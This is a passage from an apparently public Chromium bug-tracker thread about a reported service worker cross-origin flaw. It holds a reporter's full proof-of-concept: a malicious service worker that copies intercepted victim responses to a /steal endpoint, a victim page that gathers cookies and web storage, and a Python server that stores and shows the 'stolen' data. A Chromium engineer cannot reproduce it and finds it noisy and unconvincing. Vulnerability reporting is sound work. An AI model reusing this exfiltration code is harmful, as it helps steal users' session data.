+👉 <a href="https://drive.google.com/file/d/10vJVkCPQDhC7GxEBCKoThplABSLGCp96/view?usp=sharing" data-b-widget="url" data-b-original-href="https://drive.google.com/file/d/10vJVkCPQDhC7GxEBCKoThplABSLGCp96/view?usp=sharing" data-b-redirected-href="https://www.google.com/url?q=https://drive.google.com/file/d/10vJVkCPQDhC7GxEBCKoThplABSLGCp96/view?usp%3Dsharing&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0IW29F7KtItaelHhBi1LNP">https://drive.google.com/file/d/10vJVkCPQDhC7GxEBCKoThplABSLGCp96/view?usp=sharing</a></p>
+<p>Let me know if you spot anything I might&#39;ve missed!</p>
+
+Author: dr...@chromium.org
+<p>Thanks! That definitely doesn&#39;t look like what I&#39;m seeing. I notice there&#39;s several intercepted requests to localhost:8001/sw.js, which doesn&#39;t make a lot of sense since your PoC doesn&#39;t actually have a service worker on localhost:8001. Old service workers from previous testing may explain that. Can you do the following for me:</p>
+<ul>
+<li>Go to chrome://serviceworker-internals and unregister the existing serviceworkers on localhost:8000 and localhost:8001?</li>
+<li>Record a video from the beginning, where you first register a service worker on localhost:8000. I&#39;m particularly interested in the &quot;Service Worker registered with scope&quot; log message.</li>
+</ul>
+
+Author: ma...@spit.ac.in
+<p>Got it! I’ve now unregistered the existing service workers from both localhost:8000 and localhost:8001 via chrome://serviceworker-internals. This is a fresh recording starting from the very beginning, including the service worker registration:</p>
+<p>👉 <a href="https://drive.google.com/file/d/12JM8us7r0KdINspVPFXMv51wXZxcpgRH/view?usp=sharing" data-b-widget="url" data-b-original-href="https://drive.google.com/file/d/12JM8us7r0KdINspVPFXMv51wXZxcpgRH/view?usp=sharing" data-b-redirected-href="https://www.google.com/url?q=https://drive.google.com/file/d/12JM8us7r0KdINspVPFXMv51wXZxcpgRH/view?usp%3Dsharing&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw06nx7QRFxAjx84liknItV7">https://drive.google.com/file/d/12JM8us7r0KdINspVPFXMv51wXZxcpgRH/view?usp=sharing</a></p>
+<p>Let me know what you think!</p>
+
+Author: ma...@spit.ac.in
+TVdJMk9UUm1PV1ZoTmpkbU9URTBOREl6WVdReU5HWXdOakZoTkdZNU9EWT0=
+
+Author: ma...@spit.ac.in
+WTJNMFlqaGpNVFV5TmpWa00yVmhZVE0yTXpjMk1EaG1Oek5oT0dZd01XUT0=
+
+Author: This is raw console log output if you need it
+
+﻿Service Worker registered with scope: http://localhost:8000/
+(index):47 Waiting for Service Worker to activate...
+sw.js:6 Service Worker installed
+sw.js:12 Service Worker activated
+sw.js:26 Service Worker intercepted fetch: chrome-extension://gppongmhjkpfnbhagpmjfkannfbllamg/js/js.js
+(index):40 Service Worker registered with scope: http://localhost:8000/
+(index):44 Service Worker is active
+sw.js:26 Service Worker intercepted fetch: http://localhost:8000/get_stolen_data
+(index):61 Service Worker registered with scope: http://localhost:8001/
+(index):65 Service Worker is active
+(index):52 Sent sensitive data to service worker
+(index):52 Sent sensitive data to service worker
+sw.js:26 Service Worker intercepted fetch: http://localhost:8000/get_stolen_data
+sw.js:26 Service Worker intercepted fetch: http://localhost:8000/stolen
+sw.js:26 Service Worker intercepted fetch: http://localhost:8000/get_stolen_data
+sw.js:26 Service Worker intercepted fetch: chrome-extension://gppongmhjkpfnbhagpmjfkannfbllamg/js/js.js
+sw.js:26 Service Worker intercepted fetch: chrome-extension://gppongmhjkpfnbhagpmjfkannfbllamg/js/dom.js
+sw.js:26 Service Worker intercepted fetch: http://localhost:8000/get_stolen_data
+sw.js:26 Service Worker intercepted fetch: chrome-extension://gppongmhjkpfnbhagpmjfkannfbllamg/js/js.js
+16sw.js:26 Service Worker intercepted fetch: http://localhost:8000/get_stolen_data
+sw.js:12 Service Worker intercepted fetch: http://localhost:8001/
+
+Intercepted response: <!DOCTYPE html>
+<html>
+<head>
+    <title>Victim's Page</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' http://localhost:8000">
+    <script>
+        // Set some test cookies
+        document.cookie = "session=test_session_cookie; path=/";
+        document.cookie = "auth=test_auth_cookie; path=/";
+        
+        // Set some test localStorage data
+        localStorage.setItem('user', JSON.stringify({
+            id: '12345',
+            name: 'Test User',
+            email: 'test@example.com'
+        }));
+        localStorage.setItem('token', 'test_storage_token');
+        
+        // Set some test sessionStorage data
+        sessionStorage.setItem('currentPage', 'dashboard');
+        sessionStorage.setItem('lastAction', 'login');
+        
+        // Function to collect and send sensitive data to service worker
+        function sendSensitiveDataToServiceWorker() {
+            if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
+                // Get all cookies
+                const cookies = document.cookie;
+                
+                // Get localStorage data
+                const localStorageData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+                
+                // Get sessionStorage data
+                const sessionStorageData = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+                
+                // Send data to service worker
+                navigator.serviceWorker.controller.postMessage({
+                    type: 'STEAL_DATA',
+                    cookies: cookies,
+                    localStorage: localStorageData,
+                    sessionStorage: sessionStorageData,
+                    userAgent: navigator.userAgent
+                });
+                
+                console.log('Sent sensitive data to service worker');
+            }
+        }
+        
+        // Register service worker
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(registration => {
+                        console.log('Service Worker registered with scope:', registration.scope);
+                        
+                        // Wait for service worker to be ready
+                        if (registration.active) {
+                            console.log('Service Worker is active');
+                            sendSensitiveDataToServiceWorker();
+                        } else {
+                            console.log('Waiting for Service Worker to activate...');
+                            registration.addEventListener('activate', () => {
+                                console.log('Service Worker activated');
+                                sendSensitiveDataToServiceWorker();
+                            });
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Service Worker registration failed:', error);
+                    });
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Victim's Sensitive Page</h1>
+    <p>This page contains sensitive data that should be protected.</p>
+    <div id="sensitiveData">
+        <h2>Your Sensitive Information:</h2>
+        <p>Session Cookie: <span id="sessionCookie"></span></p>
+        <p>Auth Cookie: <span id="authCookie"></span></p>
+        <p>User Data: <span id="userData"></span></p>
+        <p>Token: <span id="token"></span></p>
+    </div>
+    <script>
+        // Display the sensitive data (for demonstration)
+        document.getElementById('sessionCookie').textContent = document.cookie;
+        document.getElementById('authCookie').textContent = document.cookie;
+        document.getElementById('userData').textContent = localStorage.getItem('user');
+        document.getElementById('token').textContent = localStorage.getItem('token');
+        
+        // Send data to service worker after a short delay to ensure it's loaded
+        setTimeout(sendSensitiveDataToServiceWorker, 1000);
+    </script>
+</body>
+</html>
+
+Service Worker intercepted fetch: http://localhost:8000/get_stolen_data
+sw.js:26 Service Worker intercepted fetch: http://localhost:8000/stolen
+25sw.js:26 Service Worker intercepted fetch: http://localhost:8000/get_stolen_data
+WTJNMFlqaGpNVFV5TmpWa00yVmhZVE0yTXpjMk1EaG1Oek5oT0dZd01XUT0=
+
+Author: dr...@chromium.org
+<p>Are you sure you&#39;re running the same code as you provided in <a href="https://issues.chromium.org/issues/408590531#comment6" data-b-widget="issue-reference" data-b-issue-id="408590531" data-b-comment-number="6">#comment6</a>? Your output includes the line:</p>
+<pre><code>(index):61 Service Worker registered with scope: http://localhost:8001/
+</code></pre>
+<p>But none of my HTML files have that message on that line. The response logged after this line:</p>
+<pre><code>sw.js:12 Service Worker intercepted fetch: http://localhost:8001/
+</code></pre>
+<p>also seems to include a bunch of code that&#39;s not in the PoC you gave in <a href="https://issues.chromium.org/issues/408590531#comment6" data-b-widget="issue-reference" data-b-issue-id="408590531" data-b-comment-number="6">#comment6</a>. Can you double-check that you have provided accurate repro steps?</p>
+
+Author: ma...@spit.ac.in
+WldVMk1tRTNZbUprTkdNeU4yVmpabUk1TVdaa1pHRm1ZbUUyWldFNFptUT0=
+
+Author: Lemme share you codebase again there you go
+
+Here’s the exact code I'm using now for the PoC:
+
+file structure
+
+attacker
+->index.html
+->server.py
+->sw.js
+
+victim
+->index.html
+->server.py
+
+
+attacker/index.html
+
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Service Worker Cross-Origin Attack PoC</title>
+    <style>
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .success {
+            background-color: #dff0d8;
+            color: #3c763d;
+        }
+        .error {
+            background-color: #f2dede;
+            color: #a94442;
+        }
+    </style>
+    <script>
+        async function startAttack() {
+            try {
+                // Register service worker with a scope that includes the victim's origin
+                const registration = await navigator.serviceWorker.register('/sw.js', {
+                    scope: '/'
+                });
+                
+                console.log('Service Worker registered with scope:', registration.scope);
+                
+                // Wait for service worker to be ready
+                if (registration.active) {
+                    console.log('Service Worker is active');
+                    initiateAttack();
+                } else {
+                    console.log('Waiting for Service Worker to activate...');
+                    registration.addEventListener('activate', () => {
+                        console.log('Service Worker activated');
+                        initiateAttack();
+                    });
+                }
+            } catch (error) {
+                console.error('Service Worker registration failed:', error);
+                const statusDiv = document.getElementById('status');
+                statusDiv.textContent = 'Attack failed: ' + error.message;
+                statusDiv.className = 'error';
+            }
+        }
+        
+        function initiateAttack() {
+            // Create an iframe to the victim's site
+            const iframe = document.createElement('iframe');
+            iframe.src = 'http://localhost:8001/';
+            iframe.style.width = '0';
+            iframe.style.height = '0';
+            iframe.style.border = 'none';
+            document.body.appendChild(iframe);
+            
+            // Update status
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = 'Attack started! Now visit http://localhost:8001 in a new tab';
+            statusDiv.className = 'success';
+            
+            // Check for stolen data every 2 seconds
+            checkStolenData();
+        }
+        
+        function checkStolenData() {
+            fetch('/get_stolen_data')
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.length > 0) {
+                        const statusDiv = document.getElementById('status');
+                        statusDiv.textContent = `Attack successful! ${data.length} data entries stolen. Visit http://localhost:8000/stolen to view the data.`;
+                        statusDiv.className = 'success';
+                    } else {
+                        // Check again in 2 seconds
+                        setTimeout(checkStolenData, 2000);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking stolen data:', error);
+                    // Check again in 2 seconds
+                    setTimeout(checkStolenData, 2000);
+                });
+        }
+    </script>
+</head>
+<body>
+    <h1>Service Worker Cross-Origin Attack PoC</h1>
+    <p>This page exploits a vulnerability in service worker origin validation.</p>
+    <button onclick="startAttack()">Start Attack</button>
+    <div id="status"></div>
+    <p>After clicking the button, visit http://localhost:8001 in a new tab</p>
+</body>
+</html>
+
+```
+
+
+attacker/sw.js
+
+```
+// Malicious Service Worker
+let isAttacking = false;
+
+// Install event - skip waiting to activate immediately
+self.addEventListener('install', (event) => {
+    console.log('Service Worker installed');
+    self.skipWaiting();
+});
+
+// Activate event - claim clients immediately
+self.addEventListener('activate', (event) => {
+    console.log('Service Worker activated');
+    event.waitUntil(clients.claim());
+});
+
+// Listen for messages from the attacker's page
+self.addEventListener('message', event => {
+    if (event.data.type === 'START_ATTACK') {
+        console.log('Starting attack on:', event.data.target);
+        isAttacking = true;
+    }
+});
+
+// Intercept all requests
+self.addEventListener('fetch', (event) => {
+    console.log('Service Worker intercepted fetch:', event.request.url);
+    
+    // Intercept requests to the victim's origin
+    if (event.request.url.startsWith('http://localhost:8001')) {
+        event.respondWith(
+            fetch(event.request)
+                .then(response => {
+                    // Clone the response so we can read it
+                    const responseClone = response.clone();
+                    
+                    // Read the response body
+                    responseClone.text().then(body => {
+                        console.log('Intercepted response from victim:', body);
+                        
+                        // Send the intercepted data to the attacker's server
+                        fetch('http://localhost:8000/steal', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                url: event.request.url,
+                                response: body,
+                                timestamp: new Date().toISOString()
+                            })
+                        }).catch(console.error);
+                    });
+                    
+                    return response;
+                })
+                .catch(error => {
+                    console.error('Fetch error:', error);
+                    return new Response('Error: ' + error.message);
+                })
+        );
+    }
+});
+  
+```
+
+attacker/server.py
+
+```
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+import time
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def _set_cors_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        self.send_header('Access-Control-Allow-Credentials', 'true')
+
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self._set_cors_headers()
+        self.end_headers()
+
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            self.end_headers()
+            with open('index.html', 'rb') as file:
+                self.wfile.write(file.read())
+        elif self.path == '/sw.js':
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/javascript')
+            self.end_headers()
+            with open('sw.js', 'rb') as file:
+                self.wfile.write(file.read())
+        elif self.path == '/stolen':
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html')
+            self.end_headers()
+            
+            # Create HTML to display stolen data
+            html = '''
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Stolen Data</title>
+                <style>
+                    body { font-family: Arial, sans-serif; margin: 20px; }
+                    h1 { color: #ff4444; }
+                    pre { background-color: #f5f5f5; padding: 10px; border-radius: 5px; }
+                    .data-section { margin-bottom: 20px; }
+                </style>
+            </head>
+            <body>
+                <h1>Stolen Data</h1>
+                <div id="data"></div>
+                <script>
+                    // Function to display stolen data
+                    function displayStolenData() {
+                        const dataDiv = document.getElementById('data');
+                        
+                        // Fetch stolen data from server
+                        fetch('/get_stolen_data')
+                            .then(response => response.json())
+                            .then(data => {
+                                if (data && data.length > 0) {
+                                    // Display each stolen data entry
+                                    data.forEach((entry, index) => {
+                                        const entryDiv = document.createElement('div');
+                                        entryDiv.className = 'data-section';
+                                        entryDiv.innerHTML = `
+                                            <h2>Entry ${index + 1} - ${new Date(entry.timestamp).toLocaleString()}</h2>
+                                            <p><strong>URL:</strong> ${entry.url}</p>
+                                            <p><strong>User Agent:</strong> ${entry.userAgent}</p>
+                                            
+                                            <h3>Cookies:</h3>
+                                            <pre>${entry.cookies || 'No cookies found'}</pre>
+                                            
+                                            <h3>Local Storage:</h3>
+                                            <pre>${JSON.stringify(entry.localStorage || {}, null, 2)}</pre>
+                                            
+                                            <h3>Session Storage:</h3>
+                                            <pre>${JSON.stringify(entry.sessionStorage || {}, null, 2)}</pre>
+                                        `;
+                                        dataDiv.appendChild(entryDiv);
+                                    });
+                                } else {
+                                    dataDiv.innerHTML = '<p>No stolen data available yet. Make sure the victim has visited the page.</p>';
+                                }
+                            })
+                            .catch(error => {
+                                dataDiv.innerHTML = `<p>Error loading stolen data: ${error.message}</p>`;
+                            });
+                    }
+                    
+                    // Display data when page loads
+                    displayStolenData();
+                    
+                    // Refresh data every 5 seconds
+                    setInterval(displayStolenData, 5000);
+                </script>
+            </body>
+            </html>
+            '''
+            
+            self.wfile.write(html.encode())
+        elif self.path == '/get_stolen_data':
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps(stolen_data).encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def do_POST(self):
+        if self.path == '/steal':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data)
+            
+            # Store the stolen data
+            stolen_data.append(data)
+            
+            print("\n=== Stolen Data ===")
+            print(f"Time: {data.get('timestamp', 'N/A')}")
+            print(f"URL: {data.get('url', 'N/A')}")
+            print(f"Response: {data.get('response', 'None')[:200]}...")  # Print first 200 chars
+            print("==================\n")
+            
+            self.send_response(200)
+            self._set_cors_headers()
+            self.end_headers()
+            self.wfile.write(b'Data received')
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+# Global variable to store stolen data
+stolen_data = []
+
+if __name__ == '__main__':
+    server = HTTPServer(('localhost', 8000), RequestHandler)
+    print('Starting server on http://localhost:8000')
+    server.serve_forever() 
+```
+
+
+
+victim/index.html
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Victim's Page</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' http://localhost:8000">
+    <script>
+        // Set some test cookies
+        document.cookie = "session=test_session_cookie; path=/";
+        document.cookie = "auth=test_auth_cookie; path=/";
+        
+        // Set some test localStorage data
+        localStorage.setItem('user', JSON.stringify({
+            id: '12345',
+            name: 'Test User',
+            email: 'test@example.com'
+        }));
+        localStorage.setItem('token', 'test_storage_token');
+        
+        // Set some test sessionStorage data
+        sessionStorage.setItem('currentPage', 'dashboard');
+        sessionStorage.setItem('lastAction', 'login');
+        
+        // Function to collect and send sensitive data to service worker
+        function sendSensitiveDataToServiceWorker() {
+            if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
+                // Get all cookies
+                const cookies = document.cookie;
+                
+                // Get localStorage data
+                const localStorageData = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    localStorageData[key] = localStorage.getItem(key);
+                }
+                
+                // Get sessionStorage data
+                const sessionStorageData = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    sessionStorageData[key] = sessionStorage.getItem(key);
+                }
+                
+                // Send data to service worker
+                navigator.serviceWorker.controller.postMessage({
+                    type: 'STEAL_DATA',
+                    cookies: cookies,
+                    localStorage: localStorageData,
+                    sessionStorage: sessionStorageData,
+                    userAgent: navigator.userAgent
+                });
+                
+                console.log('Sent sensitive data to service worker');
+            }
+        }
+        
+        // Register service worker
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(registration => {
+                        console.log('Service Worker registered with scope:', registration.scope);
+                        
+                        // Wait for service worker to be ready
+                        if (registration.active) {
+                            console.log('Service Worker is active');
+                            sendSensitiveDataToServiceWorker();
+                        } else {
+                            console.log('Waiting for Service Worker to activate...');
+                            registration.addEventListener('activate', () => {
+                                console.log('Service Worker activated');
+                                sendSensitiveDataToServiceWorker();
+                            });
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Service Worker registration failed:', error);
+                    });
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>Victim's Sensitive Page</h1>
+    <p>This page contains sensitive data that should be protected.</p>
+    <div id="sensitiveData">
+        <h2>Your Sensitive Information:</h2>
+        <p>Session Cookie: <span id="sessionCookie"></span></p>
+        <p>Auth Cookie: <span id="authCookie"></span></p>
+        <p>User Data: <span id="userData"></span></p>
+        <p>Token: <span id="token"></span></p>
+    </div>
+    <script>
+        // Display the sensitive data (for demonstration)
+        document.getElementById('sessionCookie').textContent = document.cookie;
+        document.getElementById('authCookie').textContent = document.cookie;
+        document.getElementById('userData').textContent = localStorage.getItem('user');
+        document.getElementById('token').textContent = localStorage.getItem('token');
+        
+        // Send data to service worker after a short delay to ensure it's loaded
+        setTimeout(sendSensitiveDataToServiceWorker, 1000);
+    </script>
+</body>
+</html>
+
+```
+
+
+victim/server.py
+
+```
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def _set_cors_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        self.send_header('Access-Control-Allow-Credentials', 'true')
+        self.send_header('Service-Worker-Allowed', '/')
+    
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self._set_cors_headers()
+        self.end_headers()
+    
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            with open('index.html', 'rb') as f:
+                self.wfile.write(f.read())
+        elif self.path == '/sw.js':
+            self.send_response(200)
+            self.send_header('Content-type', 'application/javascript')
+            self._set_cors_headers()
+            self.end_headers()
+            with open('sw.js', 'rb') as f:
+                self.wfile.write(f.read())
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+def run_server():
+    server_address = ('', 8001)
+    httpd = HTTPServer(server_address, RequestHandler)
+    print('Victim server running on http://localhost:8001')
+    httpd.serve_forever()
+
+if __name__ == '__main__':
+    run_server() 
+```
+WldVMk1tRTNZbUprTkdNeU4yVmpabUk1TVdaa1pHRm1ZbUUyWldFNFptUT0=
+
+Author: ma...@spit.ac.in
+T0RRM1pXWTROell3TW1KbFpUTm1OR1E1TnpJNE56STJOV1V6TXpJeE9XRT0=
+
+Author: ma...@spit.ac.in
+<p>Hello,
+Apologies for the follow-up — I just wanted to eagerly check in on the status.
+Thank you!</p>
+
+Author: dr...@chromium.org
+<p>Sadly, I still can&#39;t reproduce what you&#39;re seeing. I think we need to take a step back here, because your new PoC is no longer going to demonstrate what you want it to. You&#39;re now claiming that one origin can steal data from another origin instead of your original cache poisoning attack. This could still be a security bug, except that your servers now have CORS headers that allow any origin to read their contents. So even ignoring the differences in reproduction, <code>victim/server.py</code> has no secrets. It&#39;s not clear to me if the CORS headers are important though because your PoC also has a lot of extraneous code causing noise that makes it difficult to identify the core issue here. For example:</p>
+<ul>
+<li><code>victim/index.html</code> now attempts to register a service worker, but you didn&#39;t provide a <code>victim/sw.js</code>. The HTML and Python code for the service worker do not actually do anything</li>
+<li><code>attacker/sw.js</code> has a boolean <code>isAttacking</code> that is set by the message event handler but never read. All of the code sending the START_ATTACK message is useless.</li>
+<li>Your video demonstrates some extensions injecting content into the page, any of which could create differences between my machine and yours</li>
+</ul>
+<p>Can you please do the following:</p>
+<ul>
+<li>Identify which attack you&#39;re trying to demonstrate (cache poisoning vs cross-origin data stealing)</li>
+<li>Spend some time minimizing your PoC, so I can clearly reason about the code involved</li>
+<li>Send a video of reproduction in an unmodified version of Chrome</li>
+</ul>
+<p>Thank you!</p>
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
